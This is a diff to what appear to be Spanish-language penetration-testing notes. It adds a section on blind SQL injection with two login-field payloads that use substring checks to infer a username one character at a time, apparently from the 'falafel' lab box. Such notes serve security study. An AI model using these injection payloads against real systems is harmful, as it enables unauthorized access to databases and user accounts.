@@ -1128,6 +1128,16 @@ Combina esto con wfuzz y podrias probar LFIs aunque siempre intenta manual pero 
 Pues asi como revisas siempre si hay contraseñas por defecto tambien esta bien que intentes ver si el proyecto es open source y si puedes aprobechar eso.
 
 
+## SQLI Blind
+
+En este ejemplo ya tenemos un usuario valido 'admin' el mensaje si no es correcto es try again si es correcto es Wrong identification. (falafel)
+
+```bash
+admin' and substring(username,1,1)='a'-- # va a dar true o el mensaje
+admin' and substring(username,2,1)='d'-- # va a dar true o el mensaje
+```
+
+
 # Windows
 
 ## Arquitecura x86 o x64
